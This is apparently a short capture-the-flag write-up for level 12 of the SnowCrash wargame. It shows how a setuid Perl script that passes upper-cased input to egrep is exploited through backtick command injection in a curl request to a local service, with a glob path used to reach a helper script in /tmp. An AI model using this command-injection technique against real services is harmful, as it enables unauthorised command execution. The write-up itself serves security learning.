# Snowcrash12

Same story, different script

```sh
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```
The goal is also shell injection as the input is part of the command

This uses regex so we need to format our input properly

There is a call to egrep with an argument next to it, seems exploitable

Thus, our input gets in the command in uppercase so it cannot be a path to a command

We can see that our input goes into uppercase and resolves symnols like *

```shell
echo "#!/bin/bash
getflag > /tmp/flag ;" > /tmp/EXPLOIT
chmod 777 /tmp/EXPLOIT
level12:~$curl 'localhost:4646?x=`/*/exploit`'
level12:~$cat /tmp/flag
Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXX
```

No need to flag account